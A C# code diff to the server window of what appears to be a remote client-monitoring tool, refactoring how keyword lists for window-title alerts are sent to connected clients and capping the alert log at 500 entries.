@@ -597,9 +597,16 @@ public partial class ServerWindow : ThemedWindow
     {
         if (_server == null || WinNotifyEnabled.IsChecked != true) return;
         var clients = _server.ConnectedClients.Keys.ToList();
-        if (clients.Count > 0)
-            _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
-                async (id, _) => await SendWindowNotifyKeywords(id)));
+        if (clients.Count == 0) return;
+        // Serialize once on UI thread — avoids 2×N Dispatcher.InvokeAsync calls inside the loop
+        var pktData = Newtonsoft.Json.JsonConvert.SerializeObject(
+            new { Keywords = WinNotifyKeywordsList.Items.Cast<string>().ToArray() });
+        var srv = _server;
+        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
+            async (id, _) =>
+            {
+                try { await srv.SendToClient(id, new Packet { Type = PacketType.WindowNotifyKeywords, Data = pktData }); } catch { }
+            }));
     }
 
     private async void HandleWindowNotifyAlert(string clientId, WindowNotifyAlertData data)
@@ -616,6 +623,7 @@ public partial class ServerWindow : ThemedWindow
             ClientId   = clientId,
         };
         _winNotifyEntries.Insert(0, entry);
+        if (_winNotifyEntries.Count > 500) _winNotifyEntries.RemoveAt(500);
 
         NotificationService.NotifyWindowAlert(data.Keyword, data.Title);
         Log($"[WIN-NOTIFY] {user} — keyword '{data.Keyword}' — window: {data.Title}");
@@ -708,8 +716,16 @@ public partial class ServerWindow : ThemedWindow
                 if (clients.Count > 0)
                 {
                     if (enabled)
+                    {
+                        var pktData = Newtonsoft.Json.JsonConvert.SerializeObject(
+                            new { Keywords = WinNotifyKeywordsList.Items.Cast<string>().ToArray() });
+                        var srv = _server;
                         _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
-                            async (id, _) => await SendWindowNotifyKeywords(id)));
+                            async (id, _) =>
+                            {
+                                try { await srv.SendToClient(id, new Packet { Type = PacketType.WindowNotifyKeywords, Data = pktData }); } catch { }
+                            }));
+                    }
                     else
                         _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
                             async (id, _) => await SendEmptyWinNotifyKeywords(id)));
